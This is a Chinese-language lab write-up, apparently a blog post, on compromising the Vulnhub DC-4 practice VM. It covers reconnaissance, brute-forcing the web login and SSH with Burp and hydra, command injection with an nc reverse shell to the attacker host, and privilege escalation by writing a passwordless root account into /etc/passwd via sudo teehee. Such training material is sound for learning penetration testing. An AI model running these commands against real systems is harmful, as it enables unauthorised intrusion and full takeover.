-    <title>Vulnhub-DC-4渗透学习</title>
-    <url>/2022/07/04/Vulnhub-DC-4/</url>
-    <content><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><blockquote>
-<p>攻击机：Kali-2021.3：192.168.8.105</p>
-<p>靶机：Vulnhub-DC-4：192.168.8.168</p>
-</blockquote>
-<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><p>主机探活</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.8.0/24</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/04/Vulnhub-DC-4/1.png" alt></p>
-<p>扫描靶机ip</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.8.168</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/04/Vulnhub-DC-4/2.png" alt></p>
-<p>发现开放了22和80端口，把信息都记录起来</p>
-<p>继续收集信息</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">whatweb 192.168.8.168:80</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/04/Vulnhub-DC-4/3.png" alt></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nikto -host 192.168.8.168</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/04/Vulnhub-DC-4/4.png" alt></p>
-<p>nikto是kali自带的工具，用于扫描网站后台文件</p>
-<p>扫描完后发现并没有什么有用的信息了，也没有发现网站的框架、CMS等有用的信息</p>
-<h1 id="三、实战"><a href="#三、实战" class="headerlink" title="三、实战"></a>三、实战</h1><p>先尝试访问IP的80端口</p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/5.png" alt></p>
-<p>发现是个登录入口，查看源代码，感觉就只是一个简单的登录窗口</p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/6.png" alt></p>
-<p>既然是一个登录页面，尝试一下弱口令爆破吧，单独对密码进行爆破，字典使用Burp自带的</p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/7.png" alt></p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/8.png" alt></p>
-<p>爆破完之后发现密码为：happy</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>得到的账号密码</p>
-<blockquote>
-<p>admin</p>
-<p>happy</p>
-</blockquote>
-<p>回到登录页面进行登录，第一次登录后页面并没有改变，再次登录后才能登录成功</p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/9.png" alt></p>
-<p>随便试试，发现里面可以执行命令，怀疑有命令执行的漏洞</p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/10.png" alt></p>
-<p>把数据包拦截可以看到确实有命令执行</p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/11.png" alt></p>
-<p>既然是命令执行，为了方便我们的操作，反弹一下shell吧</p>
-<p>kali开启监听</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 2222</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/04/Vulnhub-DC-4/12.png" alt></p>
-<p>然后在目标上执行</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.8.105 2222</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/04/Vulnhub-DC-4/13.png" alt></p>
-<p>成功拿到shell</p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/14.png" alt></p>
-<p>再利用python得到交互式shell</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/04/Vulnhub-DC-4/15.png" alt></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们都知道，flag大概率在root中，但很明显我们的权限不够，需要提权</p>
-<ol>
-<li><p>SUID提权</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/04/Vulnhub-DC-4/16.png" alt></p>
-<p>但是并没有常见的可提权的文件，比如：</p>
-<blockquote>
-<p>nmap、vim、find、bash、more、less、nano、cp</p>
-</blockquote>
-</li>
-<li><p>免密使用的root级别命令</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/04/Vulnhub-DC-4/17.png" alt></p>
-<p>但是发现需要密码，而我们没有密码，也行不通</p>
-</li>
-</ol>
-<p>好像走到尽头了，但别忘了我们扫到它的ssh端口是开放的，因此去寻找一下存在的ssh用户</p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/18.png" alt></p>
-<p>发现存在三个用户</p>
-<p>分别进去查看一下有什么文件，发现里面只有jim用户里存有文件，然后就是不断的寻找有用的文件了，最终发现了一个存有密码的文件</p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/19.png" alt></p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/20.png" alt></p>
-<p>那接下来思路就很明确了，爆破这个用户就行了</p>
-<p>首先将密码保存到本机的passwd.txt中，用户名就jim一个就行</p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/21.png" alt></p>
-<p>然后利用hydra进行爆破</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra 192.168.8.168 -L user.txt -P passwd.txt ssh</span><br></pre></td></tr></table></figure>
-<p>成功获得jim的密码</p>
-<blockquote>
-<p>jibril04</p>
-</blockquote>
-<p><img src="/2022/07/04/Vulnhub-DC-4/22.png" alt></p>
-<p>接着利用刚刚的账号密码连接ssh进行登录</p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/23.png" alt></p>
-<p>成功登录，而且出现了一段文字，翻译一下</p>
-<blockquote>
-<p>Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</p>
-<p>Debian GNU/Linux 系统中包含的程序是免费软件；<br>每个程序的确切分配条款在<br>/usr/share/doc/*/copyright 中的单个文件。</p>
-<p>Debian GNU/Linux 绝对没有担保，在某种程度上<br>适用法律允许。<br>你有新邮件。</p>
-</blockquote>
-<p>似乎是这个系统在每个用户登录的时候发给他的通知，在最下面可以看到说jim收到了一封新邮件，那我们就去寻找一下这封邮件看看，在var目录下发现了mail</p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/24.png" alt></p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/25.png" alt></p>
-<p>翻译看看就能发现里面有另一个用户charles的密码</p>
-<blockquote>
-<p>^xHhA&amp;hvim0y</p>
-</blockquote>
-<p>现在我们可以切换目录了，但是先测试一下jim用户能不能利用SUID提权和免密使用root命令</p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/26.png" alt></p>
-<p>但是都没有成功，那就切换到charles用户试试</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su charles</span><br></pre></td></tr></table></figure>
-<p>成功切换用户，然后继续尝试上面两种提权方式</p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/27.png" alt></p>
-<p>发现了一个可以免密使用的root命令：teehee</p>
-<p>百度一下就知道这是一个编辑器，可以用来提权</p>
-<p><a href="https://www.cnblogs.com/zlgxzswjy/p/16118468.html">teehee 提权 - 隐念笎 - 博客园</a></p>
-<p>提权思路就是利用teehee的root权限在passwd中写入一个免密的root权限用户</p>
-<p>使用echo 命令与 sudo 命令配合使用，可以实现向那些只有系统管理员才有权限操作的文件中写入信息</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;abab::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/04/Vulnhub-DC-4/28.png" alt></p>
-<blockquote>
-<p>passwd文件解读：（简单理解这个即可）<br><code>root:x:0:0::/home/admin:/bin/bash</code><br>[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]<br>“-a” 选项的作用等同于 “&gt;&gt;” 命令<br>【额外补充：没有给新用户创建密码是因为你创建了也没有用，因为第2个位置是密码占位符，是占位符！！】</p>
-</blockquote>
-<p>然后切换到我们新添加的用户名</p>
-<p>成功拿到root权限，后面就进入root目录，就能成功得到flag</p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/29.png" alt></p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/30.png" alt></p>
-<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/m0_62094846/article/details/125535798">DC4-靶机</a></p>
-<p><a href="https://blog.csdn.net/qq_61237064/article/details/123594413?spm=1001.2014.3001.5502">dc-4 靶机渗透学习</a></p>
-<p><a href="https://zhuanlan.zhihu.com/p/397779150">黑客工具之hydra详细使用教程</a></p>
-<p><a href="https://www.cnblogs.com/backlion/p/10503978.html">编辑/etc/passwd文件进行权限升级的技巧</a></p>
-]]></content>
-      <categories>
-        <category>靶场&amp;靶机</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>靶机</tag>
-        <tag>渗透测试</tag>
       </tags>
   </entry>
 </search>
